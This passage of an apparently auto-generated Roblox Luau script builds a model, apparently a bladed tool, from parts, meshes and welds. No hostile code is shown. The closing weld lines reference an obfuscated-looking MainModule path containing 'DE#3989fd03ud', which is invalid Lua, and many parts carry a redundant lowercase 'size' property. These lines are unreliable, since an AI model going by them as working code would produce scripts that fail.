goldenline_6.Material = Enum.Material.Metal
goldenline_6.Orientation = Vector3.new(-90, 71.39299774169922, 0)
goldenline_6.RightSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_6.Rotation = Vector3.new(-90, -0.0010000000474974513, 71.39299774169922)
goldenline_6.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_6.TopSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_6.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_6.Name = "golden line"
goldenline_6.Parent = ycsi

local mesh_33 = Instance.new("BlockMesh")
mesh_33.Scale = Vector3.new(0.07000000029802322, 1, 0.7099999785423279)
mesh_33.Parent = goldenline_6

local goldenline_7 = Instance.new("Part")
goldenline_7.BackSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_7.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_7.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
goldenline_7.CFrame = CFrame.fromMatrix(Vector3.new(-1.674877643585205, 26.52922248840332, 15.550731658935547), Vector3.new(-0.6612161993980408, -0.000006415239568013931, -0.750195324420929), Vector3.new(-0.7501952648162842, -0.000017499569366918877, 0.6612163186073303), Vector3.new(-0.000017441576346755028, 0.9999998807907104, 0.000006796036359446589))
goldenline_7.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
goldenline_7.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_7.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_7.Material = Enum.Material.Metal
goldenline_7.Orientation = Vector3.new(-90, 131.39300537109375, 0)
goldenline_7.RightSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_7.Rotation = Vector3.new(-90, -0.0010000000474974513, 131.39300537109375)
goldenline_7.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_7.TopSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_7.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_7.Name = "golden line"
goldenline_7.Parent = ycsi

local mesh_34 = Instance.new("BlockMesh")
mesh_34.Scale = Vector3.new(0.07000000029802322, 0.5, 0.7099999785423279)
mesh_34.Parent = goldenline_7

local goldenline_8 = Instance.new("Part")
goldenline_8.BackSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_8.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_8.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
goldenline_8.CFrame = CFrame.fromMatrix(Vector3.new(-1.993664264678955, 26.529272079467773, 15.34627914428711), Vector3.new(-0.2588190734386444, -0.0000018704413378145546, -0.9659258127212524), Vector3.new(-0.9659256339073181, -0.0000014603132285628817, 0.258819043636322), Vector3.new(-0.0000019032573845834122, 0.9999998807907104, -0.0000014238794392440468))
goldenline_8.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
goldenline_8.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_8.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_8.Material = Enum.Material.Metal
goldenline_8.Orientation = Vector3.new(-90, 105, 0)
goldenline_8.RightSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_8.Rotation = Vector3.new(-90, 0, 105)
goldenline_8.Size = Vector3.new(0.20000000298023224, 0.2900000214576721, 0.3499999940395355)
goldenline_8.TopSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_8.size = Vector3.new(0.20000000298023224, 0.2900000214576721, 0.3499999940395355)
goldenline_8.Name = "golden line"
goldenline_8.Parent = ycsi

local mesh_35 = Instance.new("BlockMesh")
mesh_35.Scale = Vector3.new(0.07000000029802322, 1, 0.7099999785423279)
mesh_35.Parent = goldenline_8

local goldenline_9 = Instance.new("Part")
goldenline_9.BackSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_9.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_9.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
goldenline_9.CFrame = CFrame.fromMatrix(Vector3.new(-2.161564350128174, 26.529150009155273, 15.681140899658203), Vector3.new(0.19753235578536987, -0.000006040831522113876, -0.9802963137626648), Vector3.new(0.98029625415802, 0.00002368084096815437, 0.19753247499465942), Vector3.new(0.00002210057937190868, -0.9999998807907104, 0.000010591601494525094))
goldenline_9.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
goldenline_9.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_9.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_9.Material = Enum.Material.Metal
goldenline_9.Orientation = Vector3.new(90, 78.60700225830078, 0)
goldenline_9.RightSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_9.Rotation = Vector3.new(89.9990005493164, 0.0010000000474974513, -78.60700225830078)
goldenline_9.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_9.TopSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_9.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_9.Name = "golden line"
goldenline_9.Parent = ycsi

local mesh_36 = Instance.new("BlockMesh")
mesh_36.Scale = Vector3.new(0.07000000029802322, 0.5, 0.7099999785423279)
mesh_36.Parent = goldenline_9

local handlebar3_2 = Instance.new("Part")
handlebar3_2.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
handlebar3_2.CFrame = CFrame.fromMatrix(Vector3.new(-1.1932950019836426, 26.529272079467773, 15.032145500183105), Vector3.new(-1.9371509552001953e-07, -0.0000063378615777764935, -0.999999463558197), Vector3.new(0.0000032131940770341316, -0.9999992251396179, 0.000006312633104244014), Vector3.new(-0.9999990463256836, -0.00000321005109071848, -5.960464477539063e-08))
handlebar3_2.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
handlebar3_2.Material = Enum.Material.Metal
handlebar3_2.Orientation = Vector3.new(0, -90, 180)
handlebar3_2.Rotation = Vector3.new(91.06400299072266, -89.9209976196289, -93.44999694824219)
handlebar3_2.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
handlebar3_2.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
handlebar3_2.Name = "handle bar 3"
handlebar3_2.Parent = ycsi

local mesh_37 = Instance.new("SpecialMesh")
mesh_37.MeshType = Enum.MeshType.FileMesh
mesh_37.MeshId = "http://www.roblox.com/Asset/?id=9756362"
mesh_37.Scale = Vector3.new(0.25, 0.10000000149011612, 0.15000000596046448)
mesh_37.Parent = handlebar3_2

local red_24 = Instance.new("Part")
red_24.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_24.CFrame = CFrame.fromMatrix(Vector3.new(-1.1901593208312988, 26.52928352355957, 14.927775382995605), Vector3.new(-0.49999964237213135, -0.00000712357586962753, -0.8660248517990112), Vector3.new(0.0000032131940770341316, -0.9999992251396179, 0.000006312633104244014), Vector3.new(-0.866024374961853, 4.783511258210638e-07, 0.4999995231628418))
red_24.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_24.Material = Enum.Material.Metal
red_24.Orientation = Vector3.new(0, -60, 180)
red_24.Rotation = Vector3.new(0, -60, 180)
red_24.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_24.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_24.Name = "RED"
red_24.Parent = ycsi

local mesh_38 = Instance.new("SpecialMesh")
mesh_38.MeshType = Enum.MeshType.FileMesh
mesh_38.MeshId = "http://www.roblox.com/Asset/?id=9756362"
mesh_38.Scale = Vector3.new(0.25, 0.05000000074505806, 0.07999999821186066)
mesh_38.Parent = red_24

local red_25 = Instance.new("Part")
red_25.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_25.CFrame = CFrame.fromMatrix(Vector3.new(-2.87296724319458, 26.529272079467773, 15.357982635498047), Vector3.new(-1.6391277313232422e-07, -0.000006337862032523844, -0.9999995827674866), Vector3.new(-0.0000032186476346396375, 0.9999990463256836, -0.000006332987595669692), Vector3.new(0.9999990463256836, 0.000003210051772839506, 1.4901161193847656e-07))
red_25.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_25.Material = Enum.Material.Metal
red_25.Orientation = Vector3.new(0, 90, 0)
red_25.Rotation = Vector3.new(-87.34200286865234, 89.9209976196289, 92.91500091552734)
red_25.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_25.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_25.Name = "RED"
red_25.Parent = ycsi

local mesh_39 = Instance.new("SpecialMesh")
mesh_39.MeshType = Enum.MeshType.FileMesh
mesh_39.MeshId = "http://www.roblox.com/Asset/?id=9756362"
mesh_39.Scale = Vector3.new(0.25, 0.05000000074505806, 0.07999999821186066)
mesh_39.Parent = red_25

local red_26 = Instance.new("Part")
red_26.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_26.CFrame = CFrame.fromMatrix(Vector3.new(-2.8181347846984863, 26.529272079467773, 15.446819305419922), Vector3.new(-0.4999997019767761, -0.000007093775820976589, -0.8660252094268799), Vector3.new(-0.0000032186476346396375, 0.9999990463256836, -0.000006332987595669692), Vector3.new(0.8660244941711426, -3.8894484077900415e-07, -0.4999997019767761))
red_26.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_26.Material = Enum.Material.Metal
red_26.Orientation = Vector3.new(0, 120, 0)
red_26.Rotation = Vector3.new(180, 60, 180)
red_26.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_26.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_26.Name = "RED"
red_26.Parent = ycsi

local mesh_40 = Instance.new("SpecialMesh")
mesh_40.MeshType = Enum.MeshType.FileMesh
mesh_40.MeshId = "http://www.roblox.com/Asset/?id=9756362"
mesh_40.Scale = Vector3.new(0.25, 0.10000000149011612, 0.15000000596046448)
mesh_40.Parent = red_26

local red_27 = Instance.new("Part")
red_27.BottomSurface = Enum.SurfaceType.Weld
red_27.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_27.CFrame = CFrame.fromMatrix(Vector3.new(-2.451923370361328, 26.52926254272461, 13.563549995422363), Vector3.new(-0.9659250378608704, -0.0000014603054978579166, 0.2588202655315399), Vector3.new(-0.2588203549385071, -0.000008238179361796938, -0.9659254550933838), Vector3.new(0.0000035513462535163853, -0.9999996423721313, 0.000007574638402729761))
red_27.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_27.Material = Enum.Material.DiamondPlate
red_27.Orientation = Vector3.new(90, -165, 0)
red_27.Rotation = Vector3.new(90, 0, 165)
red_27.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_27.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_27.Name = "RED"
red_27.Parent = ycsi

local mesh_41 = Instance.new("SpecialMesh")
mesh_41.MeshType = Enum.MeshType.FileMesh
mesh_41.MeshId = "http://www.roblox.com/asset/?id=1033714"
mesh_41.Scale = Vector3.new(0.15000000596046448, 0.30000001192092896, 0.15000000596046448)
mesh_41.VertexColor = Vector3.new(10, 10, 10)
mesh_41.Parent = red_27

local weld = Instance.new("Weld")
weld.C0 = CFrame.fromMatrix(Vector3.new(0, -0.10000000149011612, 0), Vector3.new(1, 0, 0), Vector3.new(0, 0, 1), Vector3.new(0, -1, 0))
weld.C1 = CFrame.fromMatrix(Vector3.new(0, -0.20998382568359375, 0), Vector3.new(0.9999997615814209, 1.1368683772161603e-13, -1.7505427446148913e-12), Vector3.new(1.7505427446148913e-12, 1.1368683772161603e-13, -0.9999997615814209), Vector3.new(1.1368683772161603e-13, 1, -1.1368683772161603e-13))
weld.Part0 = red_27
weld.Part1 = union_2
weld.Parent = red_27

local mainthing = Instance.new("Part")
mainthing.BackSurface = Enum.SurfaceType.SmoothNoOutlines
mainthing.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
mainthing.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
mainthing.CFrame = CFrame.fromMatrix(Vector3.new(-2.16465425491333, 26.529268264770508, 14.635676383972168), Vector3.new(-0.9659253358840942, -0.0000014603050431105657, 0.25882020592689514), Vector3.new(0.25882023572921753, 0.000008184046237147413, 0.9659255146980286), Vector3.new(-0.0000035373382161196787, 0.9999998807907104, -0.000007522351552324835))
mainthing.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
mainthing.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
mainthing.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
mainthing.Material = Enum.Material.Granite
mainthing.Orientation = Vector3.new(-90, -165, 0)
mainthing.RightSurface = Enum.SurfaceType.SmoothNoOutlines
mainthing.Rotation = Vector3.new(-90, 0, -165)
mainthing.Size = Vector3.new(0.3499999940395355, 1.5399998426437378, 0.3499999940395355)
mainthing.TopSurface = Enum.SurfaceType.SmoothNoOutlines
mainthing.size = Vector3.new(0.3499999940395355, 1.5399998426437378, 0.3499999940395355)
mainthing.Name = "main thing"
mainthing.Parent = ycsi

local mesh_42 = Instance.new("CylinderMesh")
mesh_42.Scale = Vector3.new(0.699999988079071, 1, 0.699999988079071)
mesh_42.Parent = mainthing

local outermainbladewedge = Instance.new("Part")
outermainbladewedge.BackSurface = Enum.SurfaceType.SmoothNoOutlines
outermainbladewedge.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
outermainbladewedge.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
outermainbladewedge.CFrame = CFrame.fromMatrix(Vector3.new(-2.0023159980773926, 26.529279708862305, 16.205591201782227), Vector3.new(0.000012331379366514739, -0.9999998807907104, -0.000011704431926773395), Vector3.new(-0.9316365718841553, -0.000007230881692521507, -0.3633916974067688), Vector3.new(0.3633915185928345, 0.00001534868533781264, -0.9316365718841553))
outermainbladewedge.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
outermainbladewedge.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
outermainbladewedge.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
outermainbladewedge.Material = Enum.Material.SmoothPlastic
outermainbladewedge.Orientation = Vector3.new(-0.0010000000474974513, 158.6909942626953, -90)
outermainbladewedge.RightSurface = Enum.SurfaceType.SmoothNoOutlines
outermainbladewedge.Rotation = Vector3.new(-179.99899291992188, 21.30900001525879, 89.9990005493164)
outermainbladewedge.Size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
outermainbladewedge.TopSurface = Enum.SurfaceType.SmoothNoOutlines
outermainbladewedge.size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
outermainbladewedge.Name = "outer main blade wedge"
outermainbladewedge.Parent = ycsi

local mesh_43 = Instance.new("SpecialMesh")
mesh_43.MeshType = Enum.MeshType.FileMesh
mesh_43.MeshId = "http://www.roblox.com/asset/?id=9756362"
mesh_43.Scale = Vector3.new(0.14000000059604645, 0.3499999940395355, 0.1599999964237213)
mesh_43.Parent = outermainbladewedge

local red_28 = Instance.new("Part")
red_28.BackSurface = Enum.SurfaceType.SmoothNoOutlines
red_28.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
red_28.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_28.CFrame = CFrame.fromMatrix(Vector3.new(-1.7750744819641113, 26.529294967651367, 17.1695499420166), Vector3.new(0.000016702771972632036, -0.9999998807907104, -0.0000368432083632797), Vector3.new(-0.9699190855026245, -0.000007249106147355633, -0.24342770874500275), Vector3.new(0.24342744052410126, 0.000039740014472045004, -0.9699192643165588))
red_28.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_28.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
red_28.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
red_28.Material = Enum.Material.SmoothPlastic
red_28.Orientation = Vector3.new(-0.0020000000949949026, 165.91099548339844, -90)
red_28.RightSurface = Enum.SurfaceType.SmoothNoOutlines
red_28.Rotation = Vector3.new(-179.9980010986328, 14.08899974822998, 89.9990005493164)
red_28.Size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_28.TopSurface = Enum.SurfaceType.SmoothNoOutlines
red_28.size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_28.Name = "RED"
red_28.Parent = ycsi

local mesh_44 = Instance.new("SpecialMesh")
mesh_44.MeshType = Enum.MeshType.FileMesh
mesh_44.MeshId = "http://www.roblox.com/asset/?id=9756362"
mesh_44.Scale = Vector3.new(0.14000000059604645, 0.30000001192092896, 0.20000000298023224)
mesh_44.Parent = red_28

local red_29 = Instance.new("Part")
red_29.BackSurface = Enum.SurfaceType.SmoothNoOutlines
red_29.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
red_29.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_29.CFrame = CFrame.fromMatrix(Vector3.new(-1.92087984085083, 26.529314041137695, 16.43222999572754), Vector3.new(0.000011920608812943101, -0.9999998807907104, -0.000010013320206780918), Vector3.new(-0.9939444065093994, -0.000010801184544106945, -0.10988418757915497), Vector3.new(0.10988396406173706, 0.000011204485417692922, -0.9939445853233337))
red_29.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_29.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
red_29.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
red_29.Material = Enum.Material.SmoothPlastic
red_29.Orientation = Vector3.new(-0.0010000000474974513, 173.6909942626953, -90.0009994506836)
red_29.RightSurface = Enum.SurfaceType.SmoothNoOutlines
red_29.Rotation = Vector3.new(-179.99899291992188, 6.309000015258789, 89.9990005493164)
red_29.Size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_29.TopSurface = Enum.SurfaceType.SmoothNoOutlines
red_29.size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_29.Name = "RED"
red_29.Parent = ycsi

local mesh_45 = Instance.new("SpecialMesh")
mesh_45.MeshType = Enum.MeshType.FileMesh
mesh_45.MeshId = "http://www.roblox.com/asset/?id=9756362"
mesh_45.Scale = Vector3.new(0.14000000059604645, 0.4000000059604645, 0.17000000178813934)
mesh_45.Parent = red_29

local red_30 = Instance.new("Part")
red_30.BackSurface = Enum.SurfaceType.SmoothNoOutlines
red_30.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
red_30.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_30.CFrame = CFrame.fromMatrix(Vector3.new(-1.7662701606750488, 26.529294967651367, 16.970491409301758), Vector3.new(0.000008559974958188832, -0.9999998807907104, 4.74085481982911e-07), Vector3.new(-0.9635965824127197, -0.00000842356985231163, -0.26735973358154297), Vector3.new(0.2673594355583191, 0.0000017844408830569591, -0.9635968208312988))
red_30.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_30.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
red_30.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
red_30.Material = Enum.Material.SmoothPlastic
red_30.Orientation = Vector3.new(0, 164.4929962158203, -90)
red_30.RightSurface = Enum.SurfaceType.SmoothNoOutlines
red_30.Rotation = Vector3.new(180, 15.506999969482422, 89.9990005493164)
red_30.Size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_30.TopSurface = Enum.SurfaceType.SmoothNoOutlines
red_30.size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_30.Name = "RED"
red_30.Parent = ycsi

local mesh_46 = Instance.new("SpecialMesh")
mesh_46.MeshType = Enum.MeshType.FileMesh
mesh_46.MeshId = "http://www.roblox.com/asset/?id=9756362"
mesh_46.Scale = Vector3.new(0.14000000059604645, 0.20000000298023224, 0.15000000596046448)
mesh_46.Parent = red_30

local red_31 = Instance.new("Part")
red_31.BackSurface = Enum.SurfaceType.SmoothNoOutlines
red_31.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
red_31.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_31.CFrame = CFrame.fromMatrix(Vector3.new(-1.5476346015930176, 26.52925682067871, 16.1251163482666), Vector3.new(0.00000707363142282702, -0.9999998807907104, -0.000001042864823830314), Vector3.new(-0.9417116641998291, -0.000006406831744243391, -0.33642083406448364), Vector3.new(0.33642053604125977, 0.0000033369283300999086, -0.9417116641998291))
red_31.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_31.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
red_31.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
red_31.Material = Enum.Material.SmoothPlastic
red_31.Orientation = Vector3.new(0, 160.34100341796875, -90)
red_31.RightSurface = Enum.SurfaceType.SmoothNoOutlines
red_31.Rotation = Vector3.new(180, 19.659000396728516, 90)
red_31.Size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_31.TopSurface = Enum.SurfaceType.SmoothNoOutlines
red_31.size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_31.Name = "RED"
red_31.Parent = ycsi

local mesh_47 = Instance.new("SpecialMesh")
mesh_47.MeshType = Enum.MeshType.FileMesh
mesh_47.MeshId = "http://www.roblox.com/asset/?id=9756362"
mesh_47.Scale = Vector3.new(0.14000000059604645, 0.44999998807907104, 0.20000000298023224)
mesh_47.Parent = red_31

local weld_2 = Instance.new("Script")
weld_2.Disabled = true
weld_2.Name = "weld"
weld_2.Parent = ycsi

local model = Instance.new("Model")
model.WorldPivot = CFrame.fromMatrix(Vector3.new(-2.8576626777648926, 24.367469787597656, 17.375703811645508), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.2588185966014862, 0.000007921294127299916, 0.9659243226051331))
model.Parent = de3989fd03ud

local eye = Instance.new("Part")
eye.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
eye.CFrame = CFrame.fromMatrix(Vector3.new(-2.794194221496582, 22.447288513183594, 17.61255645751953), Vector3.new(0.34202370047569275, 0.000008047047231229953, 0.9396909475326538), Vector3.new(0.9396902918815613, 5.898141921534261e-07, -0.34202370047569275), Vector3.new(-0.0000031447987112187548, 0.9999988079071045, -0.000005395283551479224))
eye.Color = Color3.new(0.517647, 0.517647, 0.517647)
eye.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
eye.Material = Enum.Material.Neon
eye.Orientation = Vector3.new(-89.91200256347656, -149.76300048828125, 85.80799865722656)
eye.Rotation = Vector3.new(-90, 0, -70)
eye.Size = Vector3.new(0.05000000074505806, 0.05000000074505806, 0.05000000074505806)
eye.size = Vector3.new(0.05000000074505806, 0.05000000074505806, 0.05000000074505806)
eye.Name = "Eye"
eye.Parent = model

local mesh_48 = Instance.new("SpecialMesh")
mesh_48.MeshType = Enum.MeshType.FileMesh
mesh_48.MeshId = "http://www.roblox.com/asset/?id=156292343"
mesh_48.Offset = Vector3.new(0, 0, 0.20000000298023224)
mesh_48.Scale = Vector3.new(0.8999999761581421, 0.8999999761581421, 0.30000001192092896)
mesh_48.Parent = eye

local handle_2 = Instance.new("Part")
handle_2.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
handle_2.CFrame = CFrame.fromMatrix(Vector3.new(-2.9494831562042236, 21.747283935546875, 17.033004760742188), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.2588185966014862, -0.000007965005352161825, -0.9659243226051331), Vector3.new(-0.0000031447987112187548, 0.9999988079071045, -0.000005395283551479224))
handle_2.Color = Color3.new(0.517647, 0.517647, 0.517647)
handle_2.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
handle_2.Material = Enum.Material.Glass
handle_2.Orientation = Vector3.new(-89.91200256347656, -149.76300048828125, 170.80799865722656)
handle_2.Rotation = Vector3.new(-90, 0, 15)
handle_2.Size = Vector3.new(0.20000000298023224, 0.6000000238418579, 0.20000000298023224)
handle_2.size = Vector3.new(0.20000000298023224, 0.6000000238418579, 0.20000000298023224)
handle_2.Name = "Handle"
handle_2.Parent = model

local weld_3 = Instance.new("Weld")
weld_3.C0 = CFrame.fromMatrix(Vector3.new(0, -0.30000001192092896, 0.20000000298023224), Vector3.new(-1, 0, 8.742277657347586e-08), Vector3.new(0, 1, 0), Vector3.new(-8.742277657347586e-08, 0, -1))
weld_3.Part0 = handle_2
weld_3.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_3.Parent = handle_2

local weld_4 = Instance.new("Weld")
weld_4.C0 = CFrame.fromMatrix(Vector3.new(0, -0.4000000059604645, 0), Vector3.new(-1, -8.742277657347586e-08, 0), Vector3.new(8.742277657347586e-08, -1, 0), Vector3.new(0, 0, 1))
weld_4.Part0 = handle_2
weld_4.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_4.Parent = handle_2

local weld_5 = Instance.new("Weld")
weld_5.C0 = CFrame.fromMatrix(Vector3.new(0, -0.5, 0.20000000298023224), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_5.Part0 = handle_2
weld_5.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_5.Parent = handle_2

local weld_6 = Instance.new("Weld")
weld_6.C0 = CFrame.fromMatrix(Vector3.new(0, -0.6000000238418579, 0.5), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_6.Part0 = handle_2
weld_6.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_6.Parent = handle_2

local weld_7 = Instance.new("Weld")
weld_7.C0 = CFrame.fromMatrix(Vector3.new(0, -0.6000000238418579, 0.5), Vector3.new(1, 0, 0), Vector3.new(0, -4.371138828673793e-08, 1), Vector3.new(0, -1, -4.371138828673793e-08))
weld_7.Part0 = handle_2
weld_7.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_7.Parent = handle_2

local weld_8 = Instance.new("Weld")
weld_8.C0 = CFrame.fromMatrix(Vector3.new(0, 0, 0), Vector3.new(0.7071067690849304, 0, -0.7071067690849304), Vector3.new(0, 1, 0), Vector3.new(0.7071067690849304, 0, 0.7071067690849304))
weld_8.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_8.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Eye
weld_8.Parent = handle_2

local weld_9 = Instance.new("Weld")
weld_9.C0 = CFrame.fromMatrix(Vector3.new(0, 0, 0), Vector3.new(-4.371138828673793e-08, 0, -1), Vector3.new(0, 1, 0), Vector3.new(1, 0, -4.371138828673793e-08))
weld_9.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_9.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Eye
weld_9.Parent = handle_2

local weld_10 = Instance.new("Weld")
weld_10.C0 = CFrame.fromMatrix(Vector3.new(0, 0, 0), Vector3.new(-0.7071067690849304, 0, -0.7071067690849304), Vector3.new(0, 1, 0), Vector3.new(0.7071067690849304, 0, -0.7071067690849304))
weld_10.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_10.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Eye
weld_10.Parent = handle_2

